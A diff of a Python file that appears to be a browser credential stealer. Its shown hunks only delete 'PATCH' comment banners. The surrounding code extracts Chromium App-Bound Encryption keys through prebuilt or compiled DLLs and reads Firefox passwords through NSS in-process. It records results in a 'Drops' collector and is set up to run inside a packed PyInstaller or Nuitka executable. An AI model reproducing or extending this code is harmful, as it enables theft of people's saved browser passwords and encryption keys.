@@ -362,9 +362,7 @@ def _ensure_snappy() -> None:
         pass
 
 
-# ── PATCH 1 ──────────────────────────────────────────────────────────
-# gcc probe removed from bootstrap. Prebuilt DLLs handle ABE; source
-# runs fall back through _resolve_abe_dll -> _compile_abe_dll.
+
 def _bootstrap() -> None:
     global _BOOTSTRAPPED
     if _BOOTSTRAPPED:
@@ -372,7 +370,7 @@ def _bootstrap() -> None:
     _BOOTSTRAPPED = True
     _ensure_pycryptodome()
     _ensure_snappy()
-# ─────────────────────────────────────────────────────────────────────
+
 
 
 class Drops:
@@ -897,8 +895,7 @@ def _compile_abe_dll(cfg: dict) -> Tuple[Optional[str], Optional[str]]:
     return None, None
 
 
-# ── PATCH 2 ──────────────────────────────────────────────────────────
-# Prebuilt DLL resolver — checks _MEIPASS/dlls first, then source dir.
+
 def _resolve_abe_dll(cfg: dict) -> Tuple[Optional[str], Optional[str]]:
     name = cfg["name"].lower().replace(" ", "_") + ".dll"
     base = getattr(sys, "_MEIPASS", os.path.dirname(os.path.abspath(__file__)))
@@ -906,7 +903,7 @@ def _resolve_abe_dll(cfg: dict) -> Tuple[Optional[str], Optional[str]]:
     if os.path.isfile(dll):
         return dll, None
     return _compile_abe_dll(cfg)
-# ─────────────────────────────────────────────────────────────────────
+
 
 
 def _service_state(name: str) -> str:
@@ -1068,9 +1065,9 @@ def _get_abe_key(cfg: dict, drops: Optional[Drops] = None,
                       services=",".join(cfg["services"]))
         return None
 
-    # ── PATCH 3 ─────────────────────────────────────────────────────
+   
     dll, tdir = _resolve_abe_dll(cfg)
-    # ────────────────────────────────────────────────────────────────
+
     if not dll:
         if drops:
             drops.add("abe", "compile_failed", browser=cfg["name"])
@@ -2802,10 +2799,6 @@ def _find_nss_dir() -> Optional[str]:
     return None
 
 
-# ── PATCH 4 ──────────────────────────────────────────────────────────
-# Firefox passwords via NSS in-process. Replaces the subprocess that
-# spawned python -c "<script>" — that path dies in a Nuitka/PyInstaller
-# exe where sys.executable is the exe itself, not a Python interpreter.
 _NSS_LOCK = threading.Lock()
 
 
